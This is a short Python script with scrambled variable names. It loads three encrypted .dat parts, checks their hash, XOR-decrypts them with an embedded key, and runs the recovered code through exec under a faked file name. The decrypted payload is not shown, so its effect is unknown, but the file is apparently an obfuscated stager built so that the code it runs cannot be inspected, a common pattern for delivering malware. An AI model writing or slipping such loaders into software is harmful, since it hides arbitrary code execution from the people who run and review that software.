
import os, sys, hashlib

# ===== PATH =====
fUPPBDuh = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BPXafWZB = os.path.join(fUPPBDuh, "runtime", "parts")

# ===== PAYLOAD =====
tahSejbS = b'\xa1Y\x82\x83\xfc]_\xab\xd4X\xd8\x13\xbf\x02of\xeaM\x8c1\x85\xcc\x0b\r\x94KXy\x1dz\x15J'
CqQjPoqm = "b1050f8e26a870e6589dff8d0d5ca38e846f3f39eb5dbbc5562d6290d13b1531"
oMDqBmnD = ['p1.dat', 'p2.dat', 'p3.dat']

def _kdf(s,l=32):
    h=s;o=b""
    while len(o)<l:
        h=hashlib.sha256(h).digest();o+=h
    return o[:l]

def _xor(d,k):
    o=bytearray();kk=k
    for i in range(0,len(d),32):
        kk=hashlib.sha256(kk).digest()
        b=d[i:i+32]
        for j,c in enumerate(b):
            o.append(c^kk[j])
    return bytes(o)

# ===== LOAD =====
EcOvPLSy = b""
for p in oMDqBmnD:
    fp = os.path.join(BPXafWZB, p)
    if not os.path.exists(fp):
        sys.exit("missing part")
    with open(fp,"rb") as f:
        EcOvPLSy += f.read()

if hashlib.sha256(EcOvPLSy).hexdigest() != CqQjPoqm:
    sys.exit("integrity fail")

# ===== DECRYPT =====
RJuewPQY = _xor(EcOvPLSy, _kdf(tahSejbS)).decode("utf-8","ignore")
HsCjlMkl = compile(RJuewPQY, "<protected>", "exec")
del RJuewPQY, EcOvPLSy

# ===== EXEC (FIX __file__) =====
TXvabvdA = {
    "__name__": "__main__",
    "__file__": os.path.join(fUPPBDuh, "adsjc.py"),
    "__package__": None
}
exec(HsCjlMkl, TXvabvdA)
